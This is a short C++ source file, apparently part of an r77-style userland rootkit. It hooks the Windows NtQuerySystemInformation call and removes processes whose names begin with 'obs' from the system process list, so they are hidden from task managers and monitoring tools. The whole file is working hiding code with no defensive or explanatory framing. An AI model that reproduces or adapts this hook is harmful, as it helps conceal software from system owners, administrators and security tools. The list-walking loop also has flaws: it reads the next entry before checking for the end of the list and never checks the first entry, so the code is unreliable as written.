#include "r77.hpp"
#include "process.hpp"

NTSTATUS NTAPI r77::hk_nt_query_system_information(
	SYSTEM_INFORMATION_CLASS sys_info_cl,
	SystemProcessInformationEx *sys_info,
	SIZE_T sys_info_length,
	PSIZE_T rsp_length
)
{
	NTSTATUS status = o_nt_query_system_information( sys_info_cl, sys_info, sys_info_length, rsp_length );

	if ( NT_SUCCESS( status ) && sys_info_cl == SystemProcessInformation )
	{
		SystemProcessInformationEx *p_cur = nullptr;
		SystemProcessInformationEx *p_next = sys_info;

		do
		{
			p_cur = p_next;
			p_next = ( SystemProcessInformationEx * )( ( SIZE_T )p_cur + p_cur->NextEntryOffset );

			if ( !_wcsnicmp( p_next->ImageName.Buffer, L"obs", min( p_next->ImageName.Length, 3 ) ) )
			{
				if ( p_next->NextEntryOffset == 0 ) p_cur->NextEntryOffset = 0;
				else p_cur->NextEntryOffset += p_next->NextEntryOffset;
				p_next = p_cur;
			}

		} while ( p_cur->NextEntryOffset );
	}

	return status;
}